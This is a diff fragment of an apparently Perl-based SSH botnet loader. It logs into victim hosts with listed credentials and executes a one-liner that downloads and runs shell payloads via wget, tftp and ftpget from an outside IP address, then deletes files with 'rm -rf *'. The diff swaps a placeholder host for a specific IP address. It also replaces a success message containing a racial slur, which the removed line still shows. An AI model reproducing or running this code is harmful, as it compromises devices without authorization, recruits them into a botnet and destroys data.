@@ -16,10 +16,10 @@ scalar(@newarray); $i+=3) {
         if ($ssh->connect($newarray[$c])) {
                 if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                         $channel = $ssh->channel();
-                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://1.1.1.1/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 1.1.1.1 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 1.1.1.1; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 1.1.1.1 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *');
+                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://192.81.217.103/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 192.81.217.103 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 192.81.217.103; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 192.81.217.103 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *');
                         sleep 10;
                         $channel->close;
-                        print "\e[37;1mNigga They Joining: ".$newarray[$c]."\n";
+                        print "Joining the box! : ".$newarray[$c]."\n";
                 } else {
                         print "List Dead\n";
                 }
